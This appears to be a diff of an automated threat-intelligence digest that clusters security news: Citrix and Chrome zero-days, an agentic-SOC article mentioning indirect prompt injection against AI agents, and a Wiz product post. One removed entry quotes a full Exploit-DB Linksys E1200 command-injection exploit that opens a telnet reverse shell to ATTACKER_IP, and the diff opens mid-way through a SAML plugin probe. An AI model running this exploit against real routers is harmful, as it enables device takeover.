base + PLUGIN_PATH, "" try: r = s.get(base + "/?option=mosaml_metadata", timeout=12) if r.status_code == 200 and "EntityDescriptor" in r.text: m = re.search(r'entityID="([^"]+)"', r.text) if m: eid = m.group(1) m = re.search(r'Location="([^"]+)"', r.text) if m: acs = m.group(1) except Exception: pass try: r = s.get(base + "/?option=saml_user_login", timeout=12, allow_redirects=False) if r.status_code in (301, 302, 303, 307): loc = r.headers.get("Location", "") pu = urlparse(loc) if pu.scheme and pu.netloc: issuer = f"{pu.scheme}://{pu.netloc}" parts = [x for x in pu.path.split("/") if x] if "realms" in parts: i = parts.index("realms") if i + 1 < len(parts): issuer = f"{pu.scheme}://{pu.netloc}/realms/{parts[i + 1]}" except Exception: pass return acs, eid,
 ```
 
 #### Corroborating sources (1)
@@ -1241,26 +1199,24 @@ Researchers Use Claude to Port Pre-Auth RCE Exploit From One PLC Model to Anothe
 - Source: BleepingComputer (cyber_news_breach_reporting)
 - Published: 2026-09-04T15:25:59+00:00
 - Link: https://www.bleepingcomputer.com/news/security/hackers-target-critical-citrix-netscaler-auth-bypass-in-attacks/
-- Fetch status: ok
+- Fetch status: fetch_failed:HTTPError
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: CVE-2026-19490, Citrix
 
 #### Cluster taxonomy (union across members)
-- threat_categories: active_exploitation, ransomware_extortion
-- affected_industries: government
-- affected_products: Citrix, Microsoft SharePoint, WordPress
-- cve_ids: CVE-2026-19490, CVE-2026-3055, CVE-2026-4368
-- urgency_signals: actively_exploited, poc_available
+- threat_categories: active_exploitation
+- affected_products: Citrix
+- cve_ids: CVE-2026-19490
+- urgency_signals: actively_exploited
 - content_type: news_report
 - confidence_tier: tier_4_news
 
 #### Primary article taxonomy
-- threat_categories: ransomware_extortion, active_exploitation
-- affected_industries: government
-- affected_products: Citrix, Microsoft SharePoint, WordPress
-- cve_ids: CVE-2026-19490, CVE-2026-3055, CVE-2026-4368
-- urgency_signals: actively_exploited, poc_available
+- threat_categories: active_exploitation
+- affected_products: Citrix
+- cve_ids: CVE-2026-19490
+- urgency_signals: actively_exploited
 - content_type: news_report
 - confidence_tier: tier_4_news
 
@@ -1268,12 +1224,6 @@ Researchers Use Claude to Port Pre-Auth RCE Exploit From One PLC Model to Anothe
 
 ```
 Attackers have begun targeting a critical-severity Citrix NetScaler auth bypass flaw (CVE-2026-19490) in the wild, according to vulnerability intelligence company Previdian. [...]
-```
-
-#### Full body
-
-```
-Critical Citrix NetScaler auth bypass now leveraged in attacks By Sergiu Gatlan September 4, 2026 11:25 AM 0 Attackers have begun targeting a critical-severity Citrix NetScaler flaw in the wild, according to vulnerability intelligence company Previdian. Tracked as CVE-2026-19490 , this security flaw can allow unprivileged threat actors to bypass authentication remotely when the NetScaler appliance is configured as an AAA virtual server or as a Gateway (SSL VPN, ICA Proxy, CVPN, RDP Proxy), depending on the NetScaler firmware version and whether SAML Action is configured. "We strongly recommend that customers review the official NetScaler ADC and NetScaler Gateway security bulletin , assess whether their deployments are affected, and upgrade impacted appliances to the recommended builds as soon as possible," Citrix warned in mid-August when it addressed the flaw and urged admins to patch it as soon as possible . While the company has yet to flag the vulnerability as actively exploited in its August 19 security advisory , Previdian founder and security researcher Ryan Dewhurst told BleepingComputer on Thursday that attackers have begun targeting CVE-2026-19490 in the wild after a "credible" proof-of-concept exploit was published online. "On 3 September, one of our NetScaler sensors received requests matching the PoC from three distinct source IPs, geolocated to Australia, the United States and Germany," Dewhurst told BleepingComputer. "Our current assessment is that this provides evidence of exploitation attempts, but it does not confirm successful compromise of real-world systems." The Centre for Cybersecurity Belgium, the country's National Cybersecurity Coordination Centre for Belgium (NCC-BE), also warned on Friday of exploitation attempts targeting the CVE-2026-19490 vulnerability and urged admins to prioritize patching all vulnerable Citrix NetScaler appliances on their organizations' networks. Although Internet threat watchdog Shadowserver tracks over 22,000 NetScaler ADC appliances and nearly 1,700 Gateway instances exposed online, there is no information on how many are honeypots, have vulnerable configurations, or have already been patched against CVE-2026-19490 attacks. Citrix urged admins to patch two other NetScaler flaws ( CVE-2026-3055 and CVE-2026-4368 ) in March, just days before threat actors began exploiting them in attacks . The Cybersecurity and Infrastructure Security Agency (CISA) added the CVE-2026-3055 flaw to its catalog of actively exploited vulnerabilities one week later and ordered federal agencies to patch vulnerable Citrix appliances within three days. Since November 2021, the U.S. cybersecurity agency has tagged 23 Citrix vulnerabilities as exploited in the wild, six of which have also been abused by ransomware gangs. Once attackers have valid credentials, only 37% of their actions are blocked Overall prevention scores can hide what happens after initial access. Once attackers are using valid credentials, prevention drops sharply. The Blue Report 2026 measures defenses technique by technique across 338 million simulations run in customer production environments. Get the report Related Articles: CISA orders feds to patch Citrix NetScaler RCE flaw by Saturday Citrix urges admins to patch new NetScaler flaws as soon as possible Hackers leverage new Microsoft SharePoint exploit in attacks Hackers exploit critical JFrog Artifactory flaw to forge admin tokens Hackers target WordPress sites in miniOrange auth bypass attacks
 ```
 
 #### Corroborating sources (1)
@@ -1345,23 +1295,19 @@ Threat Intelligence Financially Motivated Threat Actor BREEZE COMET Targets Braz
 - Source: BleepingComputer (cyber_news_breach_reporting)
 - Published: 2026-09-04T11:48:17+00:00
 - Link: https://www.bleepingcomputer.com/news/security/google-warns-of-new-chrome-zero-day-flaw-exploited-in-attacks/
-- Fetch status: ok
+- Fetch status: fetch_failed:HTTPError
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
 - threat_categories: active_exploitation, zero_day
-- affected_products: AWS, OpenAI/ChatGPT, WordPress
-- cve_ids: CVE-2026-11645, CVE-2026-2441, CVE-2026-3909, CVE-2026-3910, CVE-2026-85046
 - urgency_signals: actively_exploited, zero_day
 - content_type: news_report
 - confidence_tier: tier_4_news
 
 #### Primary article taxonomy
 - threat_categories: zero_day, active_exploitation
-- affected_products: OpenAI/ChatGPT, WordPress, AWS
-- cve_ids: CVE-2026-85046, CVE-2026-11645, CVE-2026-2441, CVE-2026-3909, CVE-2026-3910
 - urgency_signals: actively_exploited, zero_day
 - content_type: news_report
 - confidence_tier: tier_4_news
@@ -1370,12 +1316,6 @@ Threat Intelligence Financially Motivated Threat Actor BREEZE COMET Targets Braz
 
 ```
 Google has updated the Chrome browser to address an actively exploited high-severity zero-day flaw in the V8 engine and 11 other vulnerabilities. [...]
-```
-
-#### Full body
-
-```
-Google warns of new Chrome zero-day flaw exploited in attacks By Bill Toulas September 4, 2026 07:48 AM 0 Google has updated the Chrome browser to address an actively exploited high-severity zero-day flaw in the V8 engine and 11 other vulnerabilities. The exploited security issue, identified as CVE-2026-85046, is described as a type confusion. It was reported to Google by researcher Salvatore Gulizia, known online as “Serotav.” The update brings Chrome to version 152.0.7977.82/.83 on Windows and macOS, and 152.0.7977.82 on Linux, as part of a gradual rollout.. “Google is aware that an exploit for CVE-2026-85046 exists in the wild,” the advisory reads . The company did not disclose any technical or specific exploitation details about the flaw to give users and dependent projects time to apply the fix. Type confusion flaws cause software to misinterpret one type of object as another, allowing attackers to corrupt memory. V8 is Chrome’s open-source JavaScript and WebAssembly engine, which compiles and executes code used by websites. Hence, CVE-2026-85046 could potentially be triggered by a specially crafted HTML page containing malicious JavaScript, potentially allowing remote code execution within Chrome's sandboxed renderer process. The update also addresses nine other high-severity vulnerabilities, including use-after-free and out-of-bounds memory flaws in Crash Reporting, Network, Compositing, WebGL, CacheStorage, DevTools, Skia, and a race condition in V8. CVE-2026-85046 is the sixth actively exploited bug Google has fixed in Chrome since the start of the year. Previous fixes include: An out-of-bounds read and write vulnerability in Chrome’s V8 JavaScript engine (CVE-2026-11645), exploited in the wild and patched in June . An iterator invalidation vulnerability (CVE-2026-2441) in CSSFontFeatureValuesMap, Chrome’s implementation of CSS font feature values, fixed in mid-February . Two additional Chrome zero-days exploited in March attacks : an out-of-bounds write flaw in the Skia 2D graphics library (CVE-2026-3909) and an inappropriate implementation issue in the V8 JavaScript and WebAssembly engine (CVE-2026-3910). A use-after-free vulnerability in Dawn (CVE-2026-5281), the cross-platform implementation of the WebGPU standard used by Chromium, was patched in April . Chrome users are recommended to apply the available update as soon as the rollout reaches them by going to Settings > About Chrome and waiting for the update to download and install. After the update process is done, a browser restart is required for the fixes to apply. A similar action is recommended for users of Chrome-based browsers, including Microsoft Edge, Brave, Opera, and Vivaldi, though it may take a couple of extra days for fixes to arrive on those apps. Once attackers have valid credentials, only 37% of their actions are blocked Overall prevention scores can hide what happens after initial access. Once attackers are using valid credentials, prevention drops sharply. The Blue Report 2026 measures defenses technique by technique across 338 million simulations run in customer production environments. Get the report Related Articles: Critical Elementor Pro flaw exploited to take over WordPress sites Hackers exploit Sangoma Switchvox flaw to deploy reverse shells Hackers exploit critical JFrog Artifactory flaw to forge admin tokens SonicWall warns of SMA1000 flaws exploited in zero-day attacks, patch now Critical Langflow flaw exploited to steal OpenAI and AWS keys
 ```
 
 #### Corroborating sources (1)
@@ -1688,51 +1628,6 @@ Frontier AI Changes Vulnerability Discovery. It Doesn’t Change How Breaches Ha
   - Published: 2026-08-31T13:38:40+00:00
   - Link: https://horizon3.ai/intelligence/blogs/frontier-ai-vulnerability-discovery/
   - Summary: Frontier AI is accelerating vulnerability discovery, but breaches still depend on what attackers can do after initial compromise. See how Horizon3 and CrowdStrike connect attacker-derived evidence to defender action.
-
-### Cluster df5dc53845 — score 14
-
-- Title: [webapps] Linksys E1200_2.0.04 - Unauthenticated OS Command Injection
-- Source: Exploit-DB (offensive_vulnerability_research)
-- Published: 2026-08-31T00:00:00+00:00
-- Link: https://www.exploit-db.com/exploits/52660
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- affected_products: GitHub
-- cve_ids: CVE-2025-60689
-- urgency_signals: preauth_unauth
-- content_type: news_report
-- confidence_tier: tier_1_offensive_research
-
-#### Primary article taxonomy
-- affected_products: GitHub
-- cve_ids: CVE-2025-60689
-- urgency_signals: preauth_unauth
-- content_type: news_report
-- confidence_tier: tier_1_offensive_research
-
-#### Summary
-
-```
-Linksys E1200_2.0.04 - Unauthenticated OS Command Injection
-```
-
-#### Full body
-
-```
-Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training Linksys E1200_2.0.04 - Unauthenticated OS Command Injection EDB-ID: 52660 CVE: 2025-60689 EDB Verified: Author: jarrett Type: webapps Exploit: / Platform: Hardware Date: 2026-08-31 Vulnerable App: # Exploit Title: Linksys E1200_2.0.04 - Unauthenticated OS Command Injection # Date: 2026-07-22 # Exploit Author: JarrettgxzSec # Vendor Homepage: www.linksys.com # Version: FW <= v2.0.04 # Tested on: v2.0.02 & v2.0.04, directly connected to the LAN # CVE: CVE-2025-60689 # Github repository: https://github.com/Jarrettgohxz/CVE-research/tree/main/Linksys/E1200-V2/CVE-2025-60689 import sys import socket import threading import time from urllib.parse import quote if len(sys.argv) < 4: print(f"[!] Usage: python3 {sys.argv[0]} <ATTACKER_IP> <TARGET_IP> <TARGET_PORT>") print(f"[!] Example: python3 {sys.argv[0]} 192.168.1.100 192.168.1.1 8080") sys.exit(1) ATTACKER_IP = sys.argv[1] TARGET_IP = sys.argv[2] TARGET_PORT = sys.argv[3] SHELL_PORT = 8888 def start_shell_listener(): with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) s.bind(('0.0.0.0', SHELL_PORT)) print(f"[*] Listening for shell on port {SHELL_PORT}...") s.listen(1) conn, addr = s.accept() print(f"[+] Connection received from {addr[0]}") # allows interactive interaction conn.setblocking(True) conn.settimeout(0.5) while True: # send command to the router cmd = input("# ") conn.send((cmd + "\n").encode()) # receive output from the router try: while True: # keep reading until the device stops sending chunk = conn.recv(4096).decode(errors='ignore') if not chunk: print("\n[!] Connection closed by target.") return print(chunk, end="", flush=True) # timeout decided by the conn.settimeout() method previously except socket.timeout: # this is expected when the device is done sending text pass def execute_exploit(): print(f"[*] Connecting to {TARGET_IP}:{TARGET_PORT}...") # 1. Build the payload payload = "\nrm /tmp/f \n" payload += "mkfifo /tmp/f \n" payload += "killall httpd && httpd \n" payload += f"cat /tmp/f | /bin/sh 2>&1 | telnet {ATTACKER_IP} {SHELL_PORT} > /tmp/f &\n" payload = quote(f" {payload}") post_data = "submit_button=&" post_data += "change_action=&" post_data += "submit_type=&" post_data += "action=&" post_data += "commit=0&" post_data += "ttcp_num=&" post_data += "ttcp_size=&" post_data += f"ttcp_ip={payload}&" post_data += "StartEPI=1" post_data = post_data.encode() # 2. Build the HTTP POST body http_req = f"POST /tmUnblock.cgi HTTP/1.1\r\n" http_req += f"Host: {TARGET_IP}\r\n" http_req += "Content-Type: application/x-www-form-urlencoded\r\n" http_req += f"Content-Length: {len(post_data)}\r\n" http_req += "Connection: close\r\n" http_req += "\r\n" http_req = http_req.encode() + post_data try: with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: s.settimeout(10) s.connect((TARGET_IP, TARGET_PORT)) s.sendall(http_req) except Exception as e: print(f"[!] Error: {e}") if __name__ == "__main__": # start the shell listener in the background listener_thread = threading.Thread(target=start_shell_listener) listener_thread.daemon = True listener_thread.start() # short sleep to ensure the listener is bound and ready time.sleep(1) # execute the exploit function execute_exploit() # keep main thread alive to interact with the shell while listener_thread.is_alive(): time.sleep(1) Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers SearchSploit Manual VulnHub OffSec Cyber Range Shellcodes Exploit Statistics Proving Grounds Penetration Testing Services Databases Exploits Google Hacking Papers Shellcodes Links Search Exploit-DB Submit Entry SearchSploit Manual Exploit Statistics Sites OffSec Kali Linux VulnHub Solutions Courses and Certifications Learn Subscriptions OffSec Cyber R
-```
-
-#### Corroborating sources (1)
-
-- **Exploit-DB** (offensive_vulnerability_research)
-  - Title: [webapps] Linksys E1200_2.0.04 - Unauthenticated OS Command Injection
-  - Published: 2026-08-31T00:00:00+00:00
-  - Link: https://www.exploit-db.com/exploits/52660
-  - Summary: Linksys E1200_2.0.04 - Unauthenticated OS Command Injection
 
 ### Cluster bda50a6645 — score 14
 
@@ -2076,49 +1971,6 @@ Attackers Breached JetBrains Cadence via Unpatched TeamCity, Extracting AWS Cred
   - Published: 2026-09-03T21:15:53+00:00
   - Link: https://aws.amazon.com/blogs/security/incident-response-guide-for-aws-cloudtrail-investigations-part-2/
   - Summary: In Part 1 of this guide, we examined two common incident scenarios: cross-account Amazon Simple Storage Service (Amazon S3) data deletion with ransomware implications, and cryptocurrency mining deployed through AWS CloudFormation using exposed AWS Management Console credentials. We also introduced key incident response terminology and investigative frameworks for analyzing AWS CloudTrail events. In this second […]
-
-### Cluster 0e8b249098 — score 11
-
-- Title: Introducing Continuous Vulnerability Assessment: Real-Time Defense for the AI Threat Era
-- Source: Wiz Research (cloud_identity_infrastructure)
-- Published: 2026-09-01T10:54:43+00:00
-- Link: https://www.wiz.io/blog/introducing-cva
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: active_exploitation
-- urgency_signals: actively_exploited
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_2_operator
-
-#### Primary article taxonomy
-- threat_categories: active_exploitation
-- urgency_signals: actively_exploited
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_2_operator
-
-#### Summary
-
-```
-Detect exposure to new vulnerabilities the moment they are published with Wiz CVA
-```
-
-#### Full body
-
-```
-We are excited to introduce Wiz's Continuous Vulnerability Assessment (CVA) - a fundamentally new operating model for vulnerability scanning that helps teams keep up in the AI Threat Era. Today, the window between "vulnerability published" and "actively exploited" is shrinking fast - and teams that rely on scheduled scanning are left exposed. Wiz CVA solves this by providing real-time visibility into your exposure to vulnerabilities as soon as they are published. Wiz now updates our vulnerability catalog the moment a new vulnerability is discovered, and immediately reassesses your exposure to it- without having to wait for the next scheduled scan. CVA ensures findings are available in near-real-time, enabling teams to detect exposure, prioritize with context, and remediate on the same day a vulnerability is published, not days later. The Challenge: Exploitation Is Moving Faster Than Ever Attackers are exploiting newly published vulnerabilities faster than ever before - in many cases within hours of public disclosure. AI has accelerated this significantly, enabling threat actors to identify affected targets and develop working exploits at a speed that was not possible by humans alone. The most critical window attackers look to exploit is precisely this gap - between the moment a vulnerability is published and the moment an organization finds the exposure and removes it. For security teams, this means they need to act fast: teams need to know where they are exposed as close to the moment of disclosure as possible, with a clear path to remediation from day one. CVA and CTEM: Continuous Exposure Management in Practice Continuous Threat Exposure Management (CTEM) is the security industry's answer to this challenge - a framework that moves organizations from periodic, point-in-time assessments to a continuous cycle of discovery, prioritization, and remediation. At its core, CTEM requires that your exposure picture is always current, not days or weeks stale - and increasingly, it is also the foundation for AI threat readiness: if your detection and response capabilities can't operate at the speed AI-assisted attacks move, you're already behind. This shift is now being mandated at the regulatory level: following CISA BOD 26-04 , FedRAMP released new guidance requiring organizations to move away from scheduled scanning toward a continuous, exposure-and-threat-based approach to vulnerability detection and remediation. Wiz has been building toward a complete CTEM solution across the platform - from cloud and code risk discovery, extending to on-prem with UVM, ASM validation enhanced with the Red Agent, and Green Agent accelerating response. CVA completes the picture for vulnerability management: it is the mechanism that ensures the "Discovery" phase of CTEM operates continuously, not on a schedule. For teams adopting or maturing a CTEM program, CVA is the operational foundation that makes continuous exposure management real. From Real-Time Detection to Remediation Surfacing a vulnerability quickly is the first step, but responding fast and knowing how to act is the key. Once CVA surfaces a finding, Wiz's Green Agent (the Resolution Agent) extends remediation to machine-speed. It provides the remediation guidance, ownership context, and root cause context needed to move from finding to fix efficiently, without having to track down asset owners or piece together generic patch documentation. The Impact of CVA Together, CVA and the Wiz platform deliver measurable improvements across the metrics that matter most: Reduced MTTD - Mean Time to Detect aligned with vulnerability publication, in near-real-time Reduced MTTR - Right owners get the context and guided remediation they need to act immediately, with Wiz Workflows automating response at scale Stronger AI threat readiness and CTEM posture - Continuous detection closes the exposure window that fast-moving, AI-assisted attacks rely on Get Started with Wiz CVA Continuous Vulnerability Assessm
-```
-
-#### Corroborating sources (1)
-
-- **Wiz Research** (cloud_identity_infrastructure)
-  - Title: Introducing Continuous Vulnerability Assessment: Real-Time Defense for the AI Threat Era
-  - Published: 2026-09-01T10:54:43+00:00
-  - Link: https://www.wiz.io/blog/introducing-cva
-  - Summary: Detect exposure to new vulnerabilities the moment they are published with Wiz CVA
 
 ### Cluster b1ece38bbc — score 11
 
@@ -2985,46 +2837,48 @@ FILTER BY YEAR 2026 2025 2024 2023 2022 2021 2020 2019 2018 2017 2016 31th Augus
   - Link: https://research.checkpoint.com/2026/31th-august-threat-intelligence-report/
   - Summary: For the latest discoveries in cyber research for the week of 31st August, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Manchester Airports Group, the UK operator of Manchester, London Stansted, and East Midlands airports, has disclosed a cyberattack that exposed data belonging to about 8.7 million customers. The compromised information includes contact details, […] The post 31th August – Threat Intelligence Report appeared first on Check Point Research .
 
-### Cluster 2e68cba663 — score 10
+### Cluster 8f89f1c57c — score 10
 
-- Title: The story behind the intelligence
-- Source: Cisco Talos (threat_research_primary)
-- Published: 2026-09-03T18:00:13+00:00
-- Link: https://blog.talosintelligence.com/the-story-behind-the-intelligence/
+- Title: The Agentic SOC – From AI Theater to Real Defense
+- Source: Recorded Future (threat_research_primary)
+- Published: 2026-09-01T00:00:00+00:00
+- Link: https://www.recordedfuture.com/blog/agentic-soc-real-defense
 - Fetch status: ok
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
-- threat_categories: ransomware_extortion
+- threat_categories: ai_security
+- affected_industries: legal_professional
 - content_type: news_report
 - confidence_tier: tier_1_primary_research
 
 #### Primary article taxonomy
-- threat_categories: ransomware_extortion
+- threat_categories: ai_security
+- affected_industries: legal_professional
 - content_type: news_report
 - confidence_tier: tier_1_primary_research
 
 #### Summary
 
 ```
-From engaging with cybercriminals to surviving a live Flamin’ Hot Cheetos taste test, Hazel reflects on the latest Beers with Talos with Azim, where they cover the full spectrum of what it takes to gather threat intel.
+Experts from Recorded Future and Accenture offer perspectives on navigating the path to becoming an agentic SOC. Find out how to plan moving beyond “AI theater” by prioritizing measurable KPIs, proactively mitigating autonomous security risks, and evolving the analyst’s role from managing alerts to managing agents.
 ```
 
 #### Full body
 
 ```
-The story behind the intelligence By Hazel Burton Thursday, September 3, 2026 14:00 Threat Source newsletter Welcome to this week’s edition of the Threat Source newsletter. Our goal is to get accurate threat intelligence to our audience as quickly as possible, with all the context you need to ask the right questions of your own environment: How at risk are we from this threat? Are we prepared for it? And what can we do about it? What you don’t often see is all the... well, frankly, “mess” involved in producing it. All the dead ends we followed until we could confirm those ends were as dead as a doornail. All the work it took to ultimately produce an assessment, supported by evidence and written so that defenders can act on it. Much of that abstraction is necessary. Defenders need intelligence they can use, not a complete account of every conversation we had, or investigative detour behind it. But it can create an overly tidy picture of both cybercrime and the work required to understand it. If you do fancy a look behind the curtain, though, may I recommend our just-published episode of Beers with Talos ? Our guest is Azim Khodjibaev, whose remit is adversary engagement. His work involves developing personas for deep- and dark-web research, engaging directly with threat actors, and building relationships with people who may become (and have been) openly threatening to him. At one point, he was maintaining eight separate personas, some of which were interacting with one another. Azim’s engagements have helped Talos identify prolific cybercriminals and contributed to wider disruption efforts. They have also resulted in ransomware operators placing “Azim sucks” in their code and accusing him of belonging to the very criminal groups he was investigating. His experiences also expose the problem with treating adversaries as uniformly sophisticated operators. Some are technically capable and highly organised. Others are impulsive, ego-driven, or one-trick ponies. Many have a scary detachment from the consequences of their actions. Increasingly, Azim is seeing less-experienced threat actors working through loosely organised online collectives. Intelligence necessarily turns that disorder into something defenders can understand and use. But occasionally, it is worth looking behind the finished product – the patience it takes to get accurate answers, who we are investigating, and the deeply human behaviour that shapes both sides. This Beers with Talos episode, “Eight People Walk Into a Dark Web Forum. They’re All Azim,” isn’t exactly going to help many people in our industry sleep better at night. But for anyone wanting to understand more about the threat we’re up against, as a co-host of the pod I’m biased, but I believe it’s an essential listen. And if that doesn’t inspire you to download the episode, perhaps my live review of trying Flamin’ Hot Cheetos for the very first time (with a chaser of Nerds) will. The one big thing Cisco Talos is highlighting a growing operational hurdle for security teams that we call the AI "safety penalty." As frontier AI models advance, their built-in guardrails are increasingly blocking legitimate defensive tasks. This was evident in July 2026 when Hugging Face's primary cloud LLM refused to analyze forensic data during a breach, delaying their response. While defenders are slowed by these frustrating refusals, adversaries are freely leveraging unconstrained models to attack at machine speed. Why do I care? This guardrail asymmetry hands the advantage directly to attackers. When a cloud-hosted AI model refuses a forensic request mid-incident, defenders lose precious time. Security teams are paying for vendor-imposed limitations without gaining a capability edge, especially as open-weight alternatives close the reasoning gap. Ultimately, relying on third-party alignment policies means a sudden update in Silicon Valley could quietly break your defensive workflows overnight. So now what? Security leadership
+The Agentic SOC – From AI Theater to Real Defense Moving beyond "AI theater" with measurable KPIs: Security teams must distinguish between genuine value and "productivity theater." Success requires defining concrete KPIs—such as cost improvement, risk reduction, and speed—to measure true ROI, rather than deploying AI tools without a clear strategic purpose. Mitigate new autonomous risks: The shift to an agentic SOC introduces distinct threats, such as indirect prompt injection, and creates visibility gaps that traditional SIEM platforms are not built to handle. Organizations should shift from post-event observability to proactive control mechanisms, such as placing strict constraints on agent compute and communication. Redefine the analyst’s role for speed at scale: As defensive timelines compress from days to seconds, the fundamental unit of work will evolve from alert handling to agent management. The human role is shifting from a manual processor to an architect, responsible for setting objectives, defining operational constraints, and overseeing the behavior of AI agents. For security teams, AI has generated both more excitement and more confusion than any technology in the last decade. As threat actors experiment with AI to hone their attacks, defenders are trying to determine which AI investments will help them measurably reduce risk. Matthew Farmer, Accenture’s Managing Director of Security Operations in EMEA, joined Recorded Future’s co-founder Christopher Ahlberg and CTO and co-founder Staffan Truvé in a recent discussion to discuss the agentic SOC and what it takes to move from “AI theater” to real defense. Read on to see the key highlights from the discussion. Avoiding the "productivity theater" trap While AI is demonstrably transforming investigation and decision-making layers in SecOps, there’s a significant risk that organizations are falling into what Farmer calls "AI productivity theater." "We can all agree that there's great production value around a lot of AI capabilities and AI products," he said. "But there are also organizations that are really struggling to achieve any kind of return on investment on their AI.” The panel noted that the difference between success and failure doesn’t necessarily have anything to do with being in a regulated or non-regulated industry. It’s more about the ability to move past the theater by defining concrete KPIs. “A lot of what people want to achieve with AI, we can already achieve with existing machine learning or SOAR automation capabilities,” Farmer said. So rather than simply deploying an AI solution for the sake of being AI-enabled, organizations need to ask whether they’re solving for cost improvement, risk reduction, or speed. They need to understand their KPIs so they can measure their true ROI. Navigating technical and operational challenges When it comes to bringing new AI solutions online, the panel noted that SOCs often face administrative, legal, and compliance limitations that eclipse any technical hurdles. They also agreed that data quality and lack of context — “two sides of the same coin” according to Truvé — remain fundamental challenges. Farmer noted that, “In the new world of tokenomics, it costs just as much money to troll through poor quality data as high-quality data.” It’s essential that security organizations feed only the best intelligence into their AI tools. Assessing new risks, from democratization to agentic threats Farmer said that security organizations used to ask a key question: “Do those [threat actors] with the capability have the motive, and do those with the motive have the capability?” We’re now in a world where non-capable threat actors can use AI to capably launch highly sophisticated attacks. Threats are also becoming more structural. The panel highlighted "indirect prompt injection"—where agents are manipulated by the very instructions they read—as a new, distinct threat vector. As companies deploy a digital workforce of AI agents,
 ```
 
 #### Corroborating sources (1)
 
-- **Cisco Talos** (threat_research_primary)
-  - Title: The story behind the intelligence
-  - Published: 2026-09-03T18:00:13+00:00
-  - Link: https://blog.talosintelligence.com/the-story-behind-the-intelligence/
-  - Summary: From engaging with cybercriminals to surviving a live Flamin’ Hot Cheetos taste test, Hazel reflects on the latest Beers with Talos with Azim, where they cover the full spectrum of what it takes to gather threat intel.
+- **Recorded Future** (threat_research_primary)
+  - Title: The Agentic SOC – From AI Theater to Real Defense
+  - Published: 2026-09-01T00:00:00+00:00
+  - Link: https://www.recordedfuture.com/blog/agentic-soc-real-defense
+  - Summary: Experts from Recorded Future and Accenture offer perspectives on navigating the path to becoming an agentic SOC. Find out how to plan moving beyond “AI theater” by prioritizing measurable KPIs, proactively mitigating autonomous security risks, and evolving the analyst’s role from managing alerts to managing agents.
 
 ### Cluster e3b723fac5 — score 10
 
@@ -3068,49 +2922,6 @@ Video This month in security with Tony Anscombe – August 2026 edition Details 
   - Published: 2026-08-31T08:55:00+00:00
   - Link: https://www.welivesecurity.com/en/videos/month-security-tony-anscombe-august-2026/
   - Summary: Details about the Hugging Face hack, critical infrastructure under attack, a spoofed in-flight Wi-Fi network, and more of this month's cybersecurity news
-
-### Cluster 8f89f1c57c — score 10
-
-- Title: The Agentic SOC – From AI Theater to Real Defense
-- Source: Recorded Future (threat_research_primary)
-- Published: 2026-09-01T00:00:00+00:00
-- Link: https://www.recordedfuture.com/blog/agentic-soc-real-defense
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: ai_security
-- affected_industries: legal_professional
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Primary article taxonomy
-- threat_categories: ai_security
-- affected_industries: legal_professional
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Summary
-
-```
-Experts from Recorded Future and Accenture offer perspectives on navigating the path to becoming an agentic SOC. Find out how to plan moving beyond “AI theater” by prioritizing measurable KPIs, proactively mitigating autonomous security risks, and evolving the analyst’s role from managing alerts to managing agents.
-```
-
-#### Full body
-
-```
-The Agentic SOC – From AI Theater to Real Defense Moving beyond "AI theater" with measurable KPIs: Security teams must distinguish between genuine value and "productivity theater." Success requires defining concrete KPIs—such as cost improvement, risk reduction, and speed—to measure true ROI, rather than deploying AI tools without a clear strategic purpose. Mitigate new autonomous risks: The shift to an agentic SOC introduces distinct threats, such as indirect prompt injection, and creates visibility gaps that traditional SIEM platforms are not built to handle. Organizations should shift from post-event observability to proactive control mechanisms, such as placing strict constraints on agent compute and communication. Redefine the analyst’s role for speed at scale: As defensive timelines compress from days to seconds, the fundamental unit of work will evolve from alert handling to agent management. The human role is shifting from a manual processor to an architect, responsible for setting objectives, defining operational constraints, and overseeing the behavior of AI agents. For security teams, AI has generated both more excitement and more confusion than any technology in the last decade. As threat actors experiment with AI to hone their attacks, defenders are trying to determine which AI investments will help them measurably reduce risk. Matthew Farmer, Accenture’s Managing Director of Security Operations in EMEA, joined Recorded Future’s co-founder Christopher Ahlberg and CTO and co-founder Staffan Truvé in a recent discussion to discuss the agentic SOC and what it takes to move from “AI theater” to real defense. Read on to see the key highlights from the discussion. Avoiding the "productivity theater" trap While AI is demonstrably transforming investigation and decision-making layers in SecOps, there’s a significant risk that organizations are falling into what Farmer calls "AI productivity theater." "We can all agree that there's great production value around a lot of AI capabilities and AI products," he said. "But there are also organizations that are really struggling to achieve any kind of return on investment on their AI.” The panel noted that the difference between success and failure doesn’t necessarily have anything to do with being in a regulated or non-regulated industry. It’s more about the ability to move past the theater by defining concrete KPIs. “A lot of what people want to achieve with AI, we can already achieve with existing machine learning or SOAR automation capabilities,” Farmer said. So rather than simply deploying an AI solution for the sake of being AI-enabled, organizations need to ask whether they’re solving for cost improvement, risk reduction, or speed. They need to understand their KPIs so they can measure their true ROI. Navigating technical and operational challenges When it comes to bringing new AI solutions online, the panel noted that SOCs often face administrative, legal, and compliance limitations that eclipse any technical hurdles. They also agreed that data quality and lack of context — “two sides of the same coin” according to Truvé — remain fundamental challenges. Farmer noted that, “In the new world of tokenomics, it costs just as much money to troll through poor quality data as high-quality data.” It’s essential that security organizations feed only the best intelligence into their AI tools. Assessing new risks, from democratization to 